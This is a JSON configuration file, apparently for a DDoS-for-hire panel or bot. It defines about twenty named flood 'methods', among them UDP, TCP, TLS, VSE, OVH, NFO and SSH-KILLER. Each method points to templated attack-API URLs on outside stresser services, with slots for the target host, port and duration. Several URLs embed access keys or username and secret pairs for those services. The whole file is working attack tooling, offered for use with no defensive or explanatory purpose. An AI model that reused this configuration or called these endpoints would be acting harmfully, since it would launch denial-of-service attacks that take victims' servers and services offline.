[
{
		"name":"https",
		"time":200,
		"description":"https METHOD [HTTPS]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://vuminhnghia.eu.org/DDOS/APIVIP.php?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS"
		]
	},
 {
		"name":"HOME",
		"time":200,
		"description":"HOME METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME&key=TCP.SH14479"
		]
	},
 {
		"name":"VSE",
		"time":200,
		"description":"UDP METHOD [VSE Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VSE&key=TCP.SH14479",
      "https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VSEV2&key=TCP.SH14479"
		]
	},
 {
		"name":"MIXAMP",
		"time":200,
		"description":"MIXAMP METHOD [MIXAMP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIXAMP&key=TCP.SH14479"
		]
	},
 {
		"name":"NFO",
		"time":200,
		"description":"NFO METHOD [NFO Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=NFO&key=TCP.SH14479"
		]
	},
 {
		"name":"OVH",
		"time":200,
		"description":"OVH METHOD [OVH Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH&key=TCP.SH14479"
		]
	},
 {
		"name":"TCP",
		"time":200,
		"description":"TCP METHOD [TCP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP&key=TCP.SH14479"
		]
	},
 {
		"name":"TLS",
		"time":200,
		"description":"TCP METHOD [TCP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS&key=TCP.SH14479"
		]
	},
 {
		"name":"TLSV2",
		"time":200,
		"description":"TCP METHOD [TCP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLSV2&key=TCP.SH14479"
		]
	},
 {
		"name":"L7-FUCK",
		"time":200,
		"description":"TCP METHOD [TCP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=L7-FUCK&key=TCP.SH14479"
		]
	},
 {
		"name":"UDP",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"permission":[],
		"api":[
			"https://loading.catgirls.foundation/loading/web?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&key=TCP.SH14479"
		]
	},
	{
		"name":".HOME",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=home"
		]
	},
 {
		"name":".GAME-UDP",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game-udp"
		]
	},
 {
		"name":".100UP-RAIN",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=100up-rain"
		]
	},
 {
		"name":".OVH-BLITZ",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovh-blitz"
		]
	},
 {
		"name":".SOCKET-MIX",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=socket-mix"
		]
	},
 {
		"name":".OVH-RAW",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovh-raw"
		]
	},
 {
		"name":".CPU-RAIL",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=cpu-rail"
		]
	},
 {
		"name":".OVH-CTX",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovh-ctx"
		]
	},
 {
		"name":".SSH-KILLER",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ssh-killer"
		]
	},
 {
		"name":".OVH-Queef",
		"time":200,
		"description":"UDP METHOD [UDP Flood]",
		"group":"test",
		"default port":80,
		"default time":40,
		"permission":[],
		"api":[
			"https://toneapi.xyz/api/attack?username=tcp&secret=tcp123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovh-queef"
		]
	}
]
